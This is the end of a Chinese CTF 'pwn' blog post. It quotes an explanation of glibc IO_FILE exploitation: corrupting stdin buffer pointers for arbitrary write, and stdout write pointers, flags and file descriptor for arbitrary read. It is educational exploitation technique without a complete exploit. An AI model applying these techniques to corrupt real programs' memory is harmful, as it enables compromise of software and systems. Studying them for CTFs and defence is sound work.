<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 一：·········································</span><br><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  </span><br><span class="line">&gt;     <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">&gt; </span><br><span class="line">&gt; 二：·········································</span><br><span class="line">&gt; count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  </span><br><span class="line">&gt; </span><br><span class="line">&gt; 三：·········································</span><br><span class="line">&gt; fp-&gt;_IO_read_end += count;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>我们可以知道它是向fp-&gt;_IO_buf_base处写入（fp-&gt;_IO_buf_end – fp-&gt;_IO_buf_base）长度的数据。</p>
<p>只要我们可以修改_IO_buf_base和_IO_buf_end就可以实现任意位置任意长度的数据写入。</p>
<p>第三部分我们放到题目each_back中来分析。</p>
<h2 id="fwrite-之-stdout任意读写"><a href="#fwrite-之-stdout任意读写" class="headerlink" title="fwrite 之 stdout任意读写"></a>fwrite 之 stdout任意读写</h2><p>因为stdout会将缓冲区中的数据输出出来，所以就具有了stdin没有的任意读功能。</p>
<p>首先说一下涉及到的指针：</p>
<ul>
<li>_IO_write_base：输出缓冲区基址。</li>
<li>_IO_write_end：输出缓冲区结束地址。</li>
<li>_IO_write_ptr：_IO_write_ptr和_IO_write_base之间的地址为已使用的缓冲区，_IO_write_ptr和_IO_write_end之间为未使用的缓冲区。</li>
<li>_IO_buf_base：输入（出）缓冲区的基地址。</li>
<li>_IO_buf_end：输入（出）缓冲区的结束地址。</li>
</ul>
<h3 id="任意写："><a href="#任意写：" class="headerlink" title="任意写："></a>任意写：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">&gt;     count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">&gt; <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     把数据拷贝到缓冲区。</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; 他的任意写是基于_IO_new_file_xsputn中将数据复制到缓冲区这一功能能实现的。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>所以我们只要构造_IO_write_ptr为write_s，_IO_write_end为write_e，自然就满足了if的条件，这样就达到了任意写的目的。</p>
<h3 id="任意读："><a href="#任意读：" class="headerlink" title="任意读："></a>任意读：</h3><p>简单写一下fwrite的关键流程：</p>
<p>_IO_new_file_xsputn —&gt; _IO_OVERFLOW(_IO_new_file_overflow) —&gt;<br>_IO_do_write</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">&gt;     count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">&gt; <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     把数据拷贝到缓冲区。</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">&gt;     &#123;</span><br><span class="line">&gt;       <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; 这里不同于上面的任意读，我们不希望他将数据拷贝到缓冲区中，这里一般构造f-&gt;_IO_write_end = f-&gt;_IO_write_ptr。</span><br><span class="line">&gt; 之后就会去调用_IO_OVERFLOW（_IO_new_file_overflow）</span><br><span class="line">&gt; _IO_new_file_overflow中有两个对flag位的检查</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">&gt; <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; 所以flag位要不包含<span class="number">8</span>和<span class="number">0x800</span></span><br><span class="line">&gt; 接下来就会调用：</span><br><span class="line">&gt; <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">&gt;     <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">&gt;              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">&gt;   <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>其中_IO_do_write函数的作用是输出缓冲区，我们这里要构造_IO_write_base为read_s，构造_IO_write_ptr为read_e。</p>
<p>在_IO_do_write中还有几个判断需要绕过：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>flag位不能包含 0x1000（_IO_IS_APPENDING），并且要构造fp-&gt;_IO_read_end = fp-&gt;_IO_write_base。</p>
<p>最后构造f-&gt;_fileno为1。</p>
<p>小结：</p>
<ul>
<li>flag位： 不能包含0x8、0x800、0x1000（最好就直接使用原本的flag）</li>
<li>构造_fileno为1</li>
<li>构造_IO_write_base=read_s，_IO_write_ptr=read_e。</li>
</ul>
</blockquote>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-12-18T13:28:57.917Z" itemprop="dateUpdated">2019-12-18 21:28:57</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2019/12/18/学习IO-FILE的任意读和任意写/" target="_blank" rel="external">http://dayjun.top/2019/12/18/学习IO-FILE的任意读和任意写/</a>
        
    </div>
    <footer>
        <a href="http://dayjun.top">
            <img src="/img/girl.jpg" alt="DaJun">
            DaJun
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IO-FILE/">IO_FILE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/12/18/学习IO-FILE的任意读和任意写/&title=《学习IO_FILE的任意读和任意写》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/12/18/学习IO-FILE的任意读和任意写/&title=《学习IO_FILE的任意读和任意写》 — DaJun的Blog&source=首先要参考：https://www.anquanke.com/post/id/194577
这里就照着ciscn2018的task_magic来写一写
文..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
  

  
    <div class="next">
      <a href="/2019/12/15/学习kernel-pwn-core/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">学习kernel pwn --- core</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#checksec"><span class="post-toc-number">1.</span> <span class="post-toc-text">checksec</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞点"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用方法"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#得到libc地址"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">得到libc地址</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#修改got表"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">修改got表</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp"><span class="post-toc-number">4.</span> <span class="post-toc-text">exp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#贴上人家的原文"><span class="post-toc-number">5.</span> <span class="post-toc-text">贴上人家的原文</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#fread-之-stdin任意写"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">fread 之 stdin任意写</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#scanf-的长度修改："><span class="post-toc-number">5.2.</span> <span class="post-toc-text">scanf 的长度修改：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#fwrite-之-stdout任意读写"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">fwrite 之 stdout任意读写</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#任意写："><span class="post-toc-number">5.3.1.</span> <span class="post-toc-text">任意写：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#任意读："><span class="post-toc-number">5.3.2.</span> <span class="post-toc-text">任意读：</span></a></li></ol></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        我们一起来让这个世界有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.png" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://3nd.xyz/" target="_blank">3ND</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                DaJun &copy; 2019
            </span>
        		
           	
           	<span>
           		<a href="http://www.miitbeian.gov.cn/" target="_blank">苏ICP备19059861号</a>
           	</span>
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/12/18/学习IO-FILE的任意读和任意写/&title=《学习IO_FILE的任意读和任意写》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/12/18/学习IO-FILE的任意读和任意写/&title=《学习IO_FILE的任意读和任意写》 — DaJun的Blog&source=首先要参考：https://www.anquanke.com/post/id/194577
这里就照着ciscn2018的task_magic来写一写
文..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACo0lEQVR42u3aQW4bMRAEQP//0w6Qa6J19wxp6VB7MgQtxeKBQzfn6yt+vv8+ySevnud3n8dJ3lo9eHh4eKOpP0/r+ZME82qir95KRkh+HQ8PD+8e77kYtBO6vQTJnPHw8PA+gZcflPNj9NnjNR4eHt5n8jaTft762yM+Hh4e3nt5s+GSEZLR8lD4YtaCh4eHF/PaC7BP+Pvi/R4eHh7eImadNQHMSkIecBTzxMPDw7vAS4bIMW0rwCzwrS/G8PDw8C7zcmQ7iX0DVr5keHh4ePd4pwZq49RNvFtcyOHh4eFd4CU/dqrd6tSFVr5weHh4eDd4eQwxiwmSctIucdEWhoeHh/cm3j6M2IDbhoa6MODh4eGNeLNerTyAmIUUdRr973fw8PDwLvDySbelYlYY8gVtL8/w8PDwTvHy8DQ5LreL0o5QLy4eHh7eBd4sKs3jgE271aw4FX0KeHh4eAte3lbVtmS1TVTtcs+iCjw8PLw9b7Ye7RF5M/KsnODh4eHd4+Uber6ttyHshh2NjIeHh3eIt78xmzWSbmJiPDw8vE/gtZHEZuvPo9723f/MHA8PD+8Xee0mnk90deovixMeHh7eDV57LJ5FA0nxOFts8PDw8O7x8q28baWa8WZNqz80quLh4eEd5eVX/pugdn+wTkZOQmc8PDy8Pe/UtjtbiLNBxoEYAg8PDy+9/V81PG0C2QPTbd/Cw8PDW/O+yyf5h79tw9ocoKOsBQ8PD+8or918Z8PVzVIxtb1+w8PDwzvF2wcEm6aB21EvHh4e3j3ebJs+dqm/fn6IJPDw8PDeyktO5W0z1qkS8vJIjYeHh/cmXl4S2tLShr9FyoKHh4d3jZeHEZvLs/ZwvImM8fDw8O7xNhdgSYGZLVC+iCsYHh4eXsf7AxqUK/CPh4RHAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '(～﹃～)~zZ';
                clearTimeout(titleTime);
            } else {
                document.title = '(￣▽￣)';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
</body>
</html>
